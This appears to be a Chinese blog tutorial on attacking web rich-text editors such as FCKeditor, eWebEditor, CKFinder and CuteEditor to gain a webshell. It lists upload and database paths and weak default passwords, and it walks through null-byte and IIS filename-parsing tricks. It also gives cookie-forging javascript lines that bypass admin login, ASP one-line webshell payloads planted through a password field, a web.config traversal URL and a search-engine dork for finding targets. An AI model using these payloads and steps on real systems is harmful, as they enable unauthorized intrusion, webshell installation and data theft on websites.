@@ -1,0 +1,533 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 常见的编辑器漏洞</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>常见的编辑器漏洞 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/30
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/编辑器漏洞">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                编辑器漏洞
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p>编辑器配合解析漏洞利用<br>编辑器自身漏洞利用</p>
+  <span id="more"></span>
+<p>比如自己搭建博客<br><hanla></hanla>wordpress，emlog，zblog<br><hanla></hanla>论坛，源码写好的，调用编辑器接口<br><hanla></hanla>dz，dedecms    +eweb/fck/kindeditor/ueditor/ckfinder/texteditor<br><hanla></hanla>源码本身没有漏洞 编辑器可能存在漏洞<br>挖掘编辑器 漏洞  </p>
+<h1 id="编辑器路径查找"><a href="#编辑器路径查找" class="headerlink" title="编辑器路径查找"></a>编辑器路径查找</h1><h4 id="查找编辑器目录"><a href="#查找编辑器目录" class="headerlink" title="查找编辑器目录"></a>查找编辑器目录</h4><p>目录扫描<br>目录遍历<br>蜘蛛爬行</p>
+<h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><p>查找路径时应注意站中站和子站的编辑器路径<br><hanla></hanla>如果进入后台查找编辑器未能正常显示的，可以利用审查元素搜索<hanla></hanla>editor<hanla></hanla>等关键字、或者<br>换低版本浏览器打开查看编辑器</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>百度相关编辑器漏洞利用<br>查看编辑器版本-根据版本查找对应漏洞利用方法-漏洞利用<br>平时注意收集各种编辑器漏洞利用方法</p>
+<h3 id="1-确定编辑器"><a href="#1-确定编辑器" class="headerlink" title="1.确定编辑器"></a><hanla></hanla>1.<hanla></hanla>确定编辑器</h3><p>网站可能存在多个编辑器<br>就是找编辑器路径</p>
+<h3 id="2-找编辑器版本对应漏洞"><a href="#2-找编辑器版本对应漏洞" class="headerlink" title="2.找编辑器版本对应漏洞"></a><hanla></hanla>2.<hanla></hanla>找编辑器版本对应漏洞</h3><p>网站可能存在多个编辑器<br><hanla></hanla>oid/<br>bbs/  这种可能是站中站<br>端口搭建的站点 经常存在编辑器漏洞<br>扫描编辑器的时候可能在二级目录下<br>信息收集下的工具都用一用，他是根据字典的大小来扫描的，可能字典不完整导致编辑器路径扫不到</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImE9Li"><img src="https://s3.jpg.cm/2021/09/30/ImE9Li.png" alt="ImE9Li.png"></a></p>
+<p>扫描出来的路径有可能目录被改过，比如<br><hanla></hanla>admin/ewebeditor<br>editor<br>edit<br>admin_editor<br><hanla></hanla>在这些目录下访问 ewebeditor.ap/htm/html  或者<hanla></hanla>asp ， upload.asp，或者<hanla></hanla>asp/upload.asp<br><hanla></hanla>如果这些目录存在，基本可以判断他是<hanla></hanla>ewebeditor<hanla></hanla>编辑器  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEj28"><img src="https://s3.jpg.cm/2021/09/30/ImEj28.png" alt="ImEj28.png"></a></p>
+<p><hanla></hanla>如果爬行的时候看到了<hanla></hanla>UpLoadFile<br><hanla></hanla>fckeditor<hanla></hanla>一般放在根目录下<br><hanla></hanla>也可能放在<hanla></hanla>amdin<hanla></hanla>目录下<br><hanla></hanla>include 目录下 ecshop<br>ewebeditor/kindeditor  编辑器  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEK5O"><img src="https://s3.jpg.cm/2021/09/30/ImEK5O.png" alt="ImEK5O.png"></a></p>
+<p>如果发现可以目录可以继续扫描二级目录<br>隐藏的站点：存在编辑器漏洞<br><hanla></hanla>子站：目录站<hanla></hanla>/ip<hanla></hanla>端口站：  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEhNw"><img src="https://s3.jpg.cm/2021/09/30/ImEhNw.png" alt="ImEhNw.png"></a></p>
+<p><hanla></hanla>有的编辑器与最新版浏览器不兼容，在<hanla></hanla>tools<hanla></hanla>在漏洞分析里面有个<hanla></hanla>ie6<hanla></hanla>的浏览器可以用<br><hanla></hanla>密码<hanla></hanla>123</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImE3yU"><img src="https://s3.jpg.cm/2021/09/30/ImE3yU.png" alt="ImE3yU.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEDVr"><img src="https://s3.jpg.cm/2021/09/30/ImEDVr.png" alt="ImEDVr.png"></a></p>
+<h2 id="fckeditor"><a href="#fckeditor" class="headerlink" title="fckeditor"></a>fckeditor</h2><p>eweb<br>uploadfile/2020302342.jpg<br>fck<br>/usrfiles/image/20200418.jpg<br><hanla></hanla>高版本可能是时间戳命名<br><hanla></hanla>fck<hanla></hanla>针对于版本漏洞利用<br><hanla></hanla>fck&lt;2.6.4  3.<hanla></hanla>几叫<hanla></hanla>ckeditor<br><hanla></hanla>fck<hanla></hanla>配合解析漏洞利用，看网站容器有没有利用的解析漏洞</p>
+<pre><code><hanla></hanla>FCKeditor<hanla></hanla>编辑器页&nbsp;  
+FCKeditor/_samples/default.html&nbsp;  
+查看编辑器版本&nbsp;   
+FCKeditor/_whatsnew.html&nbsp;
+查看文件上传路径   
+fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/&nbsp;
+常见页面上传地址
+FCKeditor/editor/filemanager/browser/default/connectors/test.html  
+FCKeditor/editor/filemanager/upload/test.html  
+FCKeditor/editor/filemanager/connectors/test.html  
+FCKeditor/editor/filemanager/connectors/uploadtest.html  
+FCKeditor/_samples/default.html
+FCKeditor/_samples/default.html  
+FCKeditor/_samples/asp/sample01.asp  
+FCKeditor/_samples/asp/sample02.asp  
+FCKeditor/_samples/asp/sample03.asp  
+FCKeditor/_samples/asp/sample04.asp
+fckeditor/editor/filemanager/connectors/test.html 
+asp<hanla></hanla>常用上传页面地址
+fckeditor//editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/  
+
+fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp  
+
+fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp
+   
+aspx<hanla></hanla>常用上传地址
+fckeditor//editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/  
+
+fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/aspx/connector.aspx  
+
+fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/aspx/connector.aspx  
+php<hanla></hanla>常用上传地址
+fckeditor//editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
+
+fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/php/connector.php
+
+fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/php/connector.php
+
+fckeditor//editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
+FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)
+一些常见的路径也可以网上搜索，这里我就不列了
+</code></pre>
+<p>查看编辑器版本，找上传点，找漏洞利用<br><hanla></hanla>输入<hanla></hanla>_whatsnew.html<hanla></hanla>可以查看版本</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImETbk"><img src="https://s3.jpg.cm/2021/09/30/ImETbk.png" alt="ImETbk.png"></a></p>
+<p>查看编辑器版本，找上传点，可以配合工具利用<br>找上传接口</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEa4e"><img src="https://s3.jpg.cm/2021/09/30/ImEa4e.png" alt="ImEa4e.png"></a></p>
+<p><hanla></hanla>一般找<hanla></hanla>FCKeditor/editor/fckeditor.html</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEiDy"><img src="https://s3.jpg.cm/2021/09/30/ImEiDy.png" alt="ImEiDy.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImEMk5"><img src="https://s3.jpg.cm/2021/09/30/ImEMk5.png" alt="ImEMk5.png"></a></p>
+<p><hanla></hanla>也可以利用<hanla></hanla>fck<hanla></hanla>一些工具，弹框的不能用</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFW44"><img src="https://s3.jpg.cm/2021/09/30/ImFW44.png" alt="ImFW44.png"></a></p>
+<p>找到可以利用的接口后<br><hanla></hanla>iis6<br><hanla></hanla>目录解析<br>先创建一个目录。然后往目录传入图片马，右键审查元素获取图片马地址，然后菜刀连接就可以了  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFquG"><img src="https://s3.jpg.cm/2021/09/30/ImFquG.png" alt="ImFquG.png"></a></p>
+<p><hanla></hanla>畸形解析，畸形解析试了<hanla></hanla>cer,asa<hanla></hanla>不行<br>分号解析，可以 </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFRPu"><img src="https://s3.jpg.cm/2021/09/30/ImFRPu.png" alt="ImFRPu.png"></a></p>
+<p>上传后用菜刀连接就可以了</p>
+<p>但是没有解析漏洞怎么办<br><hanla></hanla>用<hanla></hanla>burp<hanla></hanla>抓包 %00<hanla></hanla>截断试一下<br>点前截断<br><hanla></hanla>x.asp%00.jpg  这个不一定能过去<br><hanla></hanla>x.asp%00jpg  注意这个点哦，点前截断和点后截断，后面这种能过去  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFL2z"><img src="https://s3.jpg.cm/2021/09/30/ImFL2z.png" alt="ImFL2z.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFISR"><img src="https://s3.jpg.cm/2021/09/30/ImFISR.png" alt="ImFISR.png"></a></p>
+<h3 id="第二个案例"><a href="#第二个案例" class="headerlink" title="第二个案例"></a>第二个案例</h3><p><hanla></hanla>在创建目录的时候，创建的<hanla></hanla>a.asp 中的点会自动变成<hanla></hanla>_  a_asp<br><hanla></hanla>这里使用递归创建<br><hanla></hanla>在<hanla></hanla>%F<hanla></hanla>后面（斜杠根<hanla></hanla>/） 加一个<hanla></hanla>2.asp<br><hanla></hanla>再在里面传</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFd96"><img src="https://s3.jpg.cm/2021/09/30/ImFd96.png" alt="ImFd96.png"></a></p>
+<p>截断区别</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFnMX"><img src="https://s3.jpg.cm/2021/09/30/ImFnMX.png" alt="ImFnMX.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImF7VD"><img src="https://s3.jpg.cm/2021/09/30/ImF7VD.png" alt="ImF7VD.png"></a></p>
+<p>2.4<br><hanla></hanla>1.<hanla></hanla>配合解析漏洞<br><hanla></hanla>2.<hanla></hanla>利用截断<hanla></hanla>getshell  </p>
+<p>2.5<br><hanla></hanla>利用解析漏洞，<br>递归创建 a.asp/1.asp<br><hanla></hanla>利用<hanla></hanla>00<hanla></hanla>截断<hanla></hanla>getshell<br>a.asp%00jpg<br>a.asp%00.jpg  </p>
+<p>如果碰到阿里云<br><hanla></hanla>上传后的文件名改成  a_asp 还会封你<hanla></hanla>ip<br><hanla></hanla>解决办法<br><hanla></hanla>换<hanla></hanla>ip<hanla></hanla>上传<br>截断连发三个包  </p>
+<pre><code>1.a_asp
+2.a(1)_asp
+3.a(1).asp
+</code></pre>
+<p><hanla></hanla>1.<hanla></hanla>递归创建<br><hanla></hanla>如果创建目录的时候，点变成了下滑线<hanla></hanla>1.asp-&gt;1_asp<br><hanla></hanla>那么可以在创建的时候抓包，在<hanla></hanla>%2f(就是根)<hanla></hanla>后面根一个<hanla></hanla>2.asp  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFQkp"><img src="https://s3.jpg.cm/2021/09/30/ImFQkp.png" alt="ImFQkp.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFl7T"><img src="https://s3.jpg.cm/2021/09/30/ImFl7T.png" alt="ImFl7T.png"></a></p>
+<p>2.6.4<br><hanla></hanla>以上的 重命名 202002023.jpg<br><hanla></hanla>没有漏洞了</p>
+<p><hanla></hanla>2.6.3 漏洞存在 php<hanla></hanla>版本不同也可能造成不同漏洞的产生<br><hanla></hanla>2.6.0-2.6.3  url   %2f  00<hanla></hanla>截断</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFUM2"><img src="https://s3.jpg.cm/2021/09/30/ImFUM2.png" alt="ImFUM2.png"></a></p>
+<h2 id="eweb编辑器"><a href="#eweb编辑器" class="headerlink" title="eweb编辑器"></a><hanla></hanla>eweb<hanla></hanla>编辑器</h2><p><hanla></hanla>1.<hanla></hanla>找后台–登录后台–修改上传类型–或者上传样式—，  –getshell<br><hanla></hanla>eweb<hanla></hanla>后台<br><hanla></hanla>ewebeditor<hanla></hanla>目录下<br><hanla></hanla>admin/login.asp/php/aspx/jsp<br>admin_login.asp<br>admin_style.asp  </p>
+<p>想办法登录后台<br><hanla></hanla>1.<hanla></hanla>尝试弱口令 admin/admin888   123123/123456/111111<br><hanla></hanla>2.<hanla></hanla>爆破<br><hanla></hanla>3.<hanla></hanla>下载默认数据库地址<br><hanla></hanla>/ewebeditor/db/ewebeditor.mdb<br>/ewebeditor/db/%23ewebeditor.mdb<br>/ewebeditor/db/data.mdb<br>/ewebeditor/db/db.mdb<br><hanla></hanla>适用于<hanla></hanla>03 iis6. 版本可以下载，如果是<hanla></hanla>08<hanla></hanla>以上的服务器，禁止了下载<hanla></hanla>mdb<hanla></hanla>文件<br><hanla></hanla>4.<hanla></hanla>注入得到账号密码,<hanla></hanla>如果管理员加密的过于复杂无法解密，也没有办法  </p>
+<p><hanla></hanla>2,<hanla></hanla>如果没后台-或者进不去后台<br>通过遍历漏洞，找网址数据库地址，  下载网站数据库   解密–登录网站后台–getshell<br><hanla></hanla>百度查找编辑器对应漏洞利用<br><hanla></hanla>如果之前被别人修改过上传类型，可以下载数据库查看类型样式<hanla></hanla>id,<hanla></hanla>构造上传<hanla></hanla>getshell</p>
+<p>先找后台，多扫二级目录，尝试弱口令爆破等  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFcBW"><img src="https://s3.jpg.cm/2021/09/30/ImFcBW.png" alt="ImFcBW.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFXuS"><img src="https://s3.jpg.cm/2021/09/30/ImFXuS.png" alt="ImFXuS.png"></a></p>
+<p>/ewebeditor/db/ewebeditor.mdb 尝试这个目录能不能下载</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFAPh"><img src="https://s3.jpg.cm/2021/09/30/ImFAPh.png" alt="ImFAPh.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFV3Q"><img src="https://s3.jpg.cm/2021/09/30/ImFV3Q.png" alt="ImFV3Q.png"></a></p>
+<p>注入：这种位置可能存在数据库，一般表名就是上一张图的，直接注入<br><hanla></hanla>用爬虫扫的时候看到这种路径，有可能存在注入<hanla></hanla>sqlmap<hanla></hanla>直接跑一下  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFu8H"><img src="https://s3.jpg.cm/2021/09/30/ImFu8H.png" alt="ImFu8H.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImF1mL"><img src="https://s3.jpg.cm/2021/09/30/ImF1mL.png" alt="ImF1mL.png"></a></p>
+<p><hanla></hanla>sqlmap<hanla></hanla>默认没有<hanla></hanla>editor<hanla></hanla>的表名，所有直接列出来这一步选<hanla></hanla>no 直接跑</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFH9f"><img src="https://s3.jpg.cm/2021/09/30/ImFH9f.png" alt="ImFH9f.png"></a></p>
+<p>得到用户名密码后登录，新增样式–设置—运行上传的图片类型–提交<br>—工具栏–新增工具栏—添加按钮—修改或上传图片—保存—预览</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFtQU"><img src="https://s3.jpg.cm/2021/09/30/ImFtQU.png" alt="ImFtQU.png"></a></p>
+<p>进后台后添加上传样式，增加上传类型，但是由于浏览器兼容问题我点不了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFNSO"><img src="https://s3.jpg.cm/2021/09/30/ImFNSO.png" alt="ImFNSO.png"></a></p>
+<p>目录遍历漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFS3w"><img src="https://s3.jpg.cm/2021/09/30/ImFS3w.png" alt="ImFS3w.png"></a></p>
+<p>尝试<br><hanla></hanla>admin/editor/admin_login.asp<br>admin/editor/admin_style.asp<br>admin/editor/admin_uploadfile.asp?id=11  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFrR8"><img src="https://s3.jpg.cm/2021/09/30/ImFrR8.png" alt="ImFrR8.png"></a> </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFFOe"><img src="https://s3.jpg.cm/2021/09/30/ImFFOe.png" alt="ImFFOe.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFsui"><img src="https://s3.jpg.cm/2021/09/30/ImFsui.png" alt="ImFsui.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFEBk"><img src="https://s3.jpg.cm/2021/09/30/ImFEBk.png" alt="ImFEBk.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFm8y"><img src="https://s3.jpg.cm/2021/09/30/ImFm8y.png" alt="ImFm8y.png"></a></p>
+<p><hanla></hanla>把#改成<hanla></hanla>%23<hanla></hanla>就可以下载了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFpmr"><img src="https://s3.jpg.cm/2021/09/30/ImFpmr.png" alt="ImFpmr.png"></a></p>
+<p><hanla></hanla>通过后台<hanla></hanla>getshell</p>
+<p>第二种就是根据版本漏洞进行利用</p>
+<p>如果数据库能看到有没有上传样式，后面这个位置就是上传样式</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFvT5"><img src="https://s3.jpg.cm/2021/09/30/ImFvT5.png" alt="ImFvT5.png"></a></p>
+<p><hanla></hanla>如果能进后台，可以修改密码<hanla></hanla>getshell<br><hanla></hanla>在<hanla></hanla>asp<hanla></hanla>中可以修改,<hanla></hanla>这里我直接就插崩<hanla></hanla>l,<hanla></hanla>因为长度限制后面没有闭合</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImF4Yt"><img src="https://s3.jpg.cm/2021/09/30/ImF4Yt.png" alt="ImF4Yt.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFoQC"><img src="https://s3.jpg.cm/2021/09/30/ImFoQC.png" alt="ImFoQC.png"></a></p>
+<p>198625”%&gt;&lt;%eval request(“c”)%&gt;&lt;%’<br><hanla></hanla>修改长度，用单引号最后成功插入</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFBCR"><img src="https://s3.jpg.cm/2021/09/30/ImFBCR.png" alt="ImFBCR.png"></a></p>
+<p>然后菜刀连接<br><a target="_blank" rel="noopener" href="http://192.168.43.10:8354/admin/ewebeditor/asp/config.asp"><hanla></hanla>http://192.168.43.10:8354/admin/ewebeditor/asp/config.asp</a><br><hanla></hanla>配置插马一定要本地搭建，直接插崩了很危险  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImFgRz"><img src="https://s3.jpg.cm/2021/09/30/ImFgRz.png" alt="ImFgRz.png"></a></p>
+<pre><code><hanla></hanla>ewebeditor 5.2  列目录漏洞
+ewebeditor/asp/browse.asp&nbsp;
+　　
+过滤不严，造成遍历目录漏洞&nbsp;  
+http://www.cracer.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/..&nbsp;
+　　
+利用<hanla></hanla>WebEditor session<hanla></hanla>欺骗漏洞,<hanla></hanla>进入后台&nbsp;
+
+
+ewebeditor 2.7.0 注入漏洞
+http://www.cracer.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200&nbsp;
+
+　　
+默认表名：eWebEditor_System<hanla></hanla>默认列名：sys_UserName、sys_UserPass，然后利用<hanla></hanla>nbsi<hanla></hanla>进行猜解.
+
+
+ewebeditor 2.8.0<hanla></hanla>最终版删除任意文件漏洞
+此漏洞存在于<hanla></hanla>Example\NewsSystem<hanla></hanla>目录下的<hanla></hanla>delete.asp<hanla></hanla>文件中，
+这是<hanla></hanla>ewebeditor<hanla></hanla>的测试页面，无须登陆可以直接进入。&nbsp;
+
+　　
+攻击利用: (请修改<hanla></hanla>action<hanla></hanla>字段为指定网址)&nbsp;
+Del Files.html&nbsp;
+&nbsp;
+
+
+ewebeditor php/asp...<hanla></hanla>后台通杀漏洞
+影响版本: PHP ≥ 3.0~3.8<hanla></hanla>与<hanla></hanla>asp 2.8<hanla></hanla>版也通用，或许低版本也可以，有待测试。&nbsp;
+　　
+攻击利用:&nbsp;
+　
+进入后台<hanla></hanla>/eWebEditor/admin/login.php,<hanla></hanla>随便输入一个用户和密码,<hanla></hanla>会提示出错了.&nbsp;
+　　
+这时候你清空浏览器的<hanla></hanla>url,<hanla></hanla>然后输入&nbsp;
+　　
+javascript:alert(document.cookie="adminuser="+escape("admin"));&nbsp;
+　　
+javascript:alert(document.cookie="adminpass="+escape("admin"));&nbsp;
+　　
+javascript:alert(document.cookie="admindj="+escape("1"));&nbsp;
+　　
+而后三次回车,<hanla></hanla>清空浏览器的<hanla></hanla>URL
+,<hanla></hanla>现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。
+
+
+ewebeditor 2.8 商业版插入一句话木马
+登陆后台，点击修改密码---新密码设置为 1":eval request("h")'&nbsp;
+　　
+设置成功后，访问<hanla></hanla>asp/config.asp<hanla></hanla>文件即可，一句话木马被写入到这个文件里面了
+
+
+ckfinder 任意文件上传漏洞
+CKFinder<hanla></hanla>是国外一款非常流行的所见即所得文字编辑器,<hanla></hanla>其<hanla></hanla>1.4.3 asp.net<hanla></hanla>版本存在任意文件上传漏洞，
+攻击者可以利用该漏洞上传任意文件。CKFinder<hanla></hanla>在上传文件的时候,<hanla></hanla>强制将文件名（不包括后缀）中点号等其他字符转为下划线<hanla></hanla>_，
+但是在修改文件名时却没有任何限制，从而导致可以上传<hanla></hanla>cracer_php;1.jpg 等畸形文件名，最终导致文件上传漏洞。
+然后修改文件名
+cracer.php;1.jpg
+利用<hanla></hanla>iis6.0<hanla></hanla>目录解析漏洞拿<hanla></hanla>shell
+创建目录<hanla></hanla>/x.asp/
+在目录下上传图片马即可拿<hanla></hanla>shell
+
+
+
+南方数据<hanla></hanla>southidceditor
+首先登陆后台
+利用编辑器上传:
+访问<hanla></hanla>admin/southidceditor/admin_style.asp
+修改编辑器样式,<hanla></hanla>增加<hanla></hanla>asa(不要<hanla></hanla>asp).<hanla></hanla>然后直接后台编辑新闻上传.
+
+通过<hanla></hanla>upfile_other.asp<hanla></hanla>漏洞文件直接取<hanla></hanla>SHELL
+直接打开<hanla></hanla>userreg.asp<hanla></hanla>进行注册会员，进行登录，（在未退出登录的状态下）使用双文件上传
+此方法通杀南方数据、良精系统、网软天下等
+
+在<hanla></hanla>Upfile_Photo.asp<hanla></hanla>文件中
+只限制了对”asp”，”asa”,”aspx”<hanla></hanla>类的文件上传，我们只要在”<hanla></hanla>网站配置”<hanla></hanla>的允许的上传文件类型
+处增加上传<hanla></hanla>“cer“等被服务器可解析的文件类型就可
+
+
+
+UEditor
+利用<hanla></hanla>II6.0<hanla></hanla>文件名解析漏洞，上传图片改名为<hanla></hanla>x.php;20160032342342.jpg<hanla></hanla>获取<hanla></hanla>shell
+
+DotNetTextBox<hanla></hanla>编辑器漏洞 
+关键字：system_dntb
+/
+确定有 system_dntb/uploadimg.aspx 并能打开，这时候是不能上传的，
+由于他是验证<hanla></hanla>cookie<hanla></hanla>来得出上传后的路径，这样我们可以用<hanla></hanla>cookie<hanla></hanla>欺骗工具。
+cookie:UserType=0; IsEdition=0; Info=1; uploadFolder=../system_dntb/Upload/;
+路径可以修改，只是权限够，上传后改名为<hanla></hanla>1.asp;.jpg<hanla></hanla>利用<hanla></hanla>iis<hanla></hanla>解析漏洞。
+
+
+
+phpweb<hanla></hanla>网站管理系统后台<hanla></hanla>keditor<hanla></hanla>编辑器
+两种利用方式
+第一种是利用<hanla></hanla>iis6.0<hanla></hanla>文件名解析漏洞
+xx.php;xx.jpg
+第二种方式
+%00<hanla></hanla>阶段
+xx.php%00jpg
+
+
+
+cute editor<hanla></hanla>在线编辑器本地包含漏洞
+影响版本:&nbsp;
+　　
+CuteEditor For Net 6.4&nbsp;
+　　
+脆弱描述：&nbsp;
+　　
+可以随意查看网站文件内容，危害较大。&nbsp;
+　　
+攻击利用:&nbsp;
+　　http://www.cracer.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config&nbsp;
+
+
+Cute Editor Asp.Net<hanla></hanla>版利用<hanla></hanla>iis<hanla></hanla>解析漏洞获得权限
+影响版本：
+CuteEditor for ASP.NET<hanla></hanla>中文版脆弱描述：
+脆弱描述：
+CuteEditor<hanla></hanla>对上传文件名未重命名，导致其可利用<hanla></hanla>IIS<hanla></hanla>文件名解析<hanla></hanla>Bug<hanla></hanla>获得<hanla></hanla>webshell<hanla></hanla>权限。
+攻击利用：
+可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。
+在编辑器中点击<hanla></hanla>“多媒体插入”，上传一个名为<hanla></hanla>“xxx.asp;.avi”<hanla></hanla>的网马，以此获得权限。
+
+
+
+Webhtmleditor
+利用<hanla></hanla>WIN 2003 IIS<hanla></hanla>文件名称解析漏洞获得<hanla></hanla>SHELL&nbsp;
